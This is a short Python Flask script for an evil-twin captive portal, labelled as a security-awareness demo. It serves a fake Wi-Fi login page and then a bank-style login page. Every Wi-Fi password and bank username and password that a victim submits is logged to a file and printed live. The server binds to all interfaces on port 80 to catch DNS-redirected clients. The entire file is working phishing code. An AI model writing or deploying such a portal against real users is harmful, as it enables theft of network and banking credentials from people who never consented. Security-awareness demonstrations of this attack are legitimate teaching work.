#!/usr/bin/env python3
"""
Evil Twin Captive Portal - Security Awareness Demo
Run on Kali VM. Logs all submitted credentials to captured_creds.log
and prints them live to the terminal for the presentation.
"""

from flask import Flask, render_template, request, redirect
from datetime import datetime

app = Flask(__name__)
LOGFILE = "captured_creds.log"


def log_capture(stage, data, ip):
    line = f"[{datetime.now().isoformat()}] stage={stage} ip={ip} data={data}\n"
    with open(LOGFILE, "a") as f:
        f.write(line)
    print("\n[CAPTURED]", line.strip(), "\n")


@app.route("/", methods=["GET"])
def wifi_login():
    return render_template("wifi_login.html")


@app.route("/wifi_auth", methods=["POST"])
def wifi_auth():
    data = {
        "wifi_password": request.form.get("wifi_password", "")
    }
    log_capture("wifi", data, request.remote_addr)
    # send victim onward to the "verification" bank-style page
    return redirect("/secure-banking")


@app.route("/secure-banking", methods=["GET"])
def bank_page():
    return render_template("bank_login.html")


@app.route("/bank_auth", methods=["POST"])
def bank_auth():
    data = {
        "username": request.form.get("username", ""),
        "password": request.form.get("password", "")
    }
    log_capture("bank_demo", data, request.remote_addr)
    return render_template("captured_success.html")


if __name__ == "__main__":
    # Bind on all interfaces, port 80, so DNS-redirected clients land here
    app.run(host="0.0.0.0", port=80, debug=False)
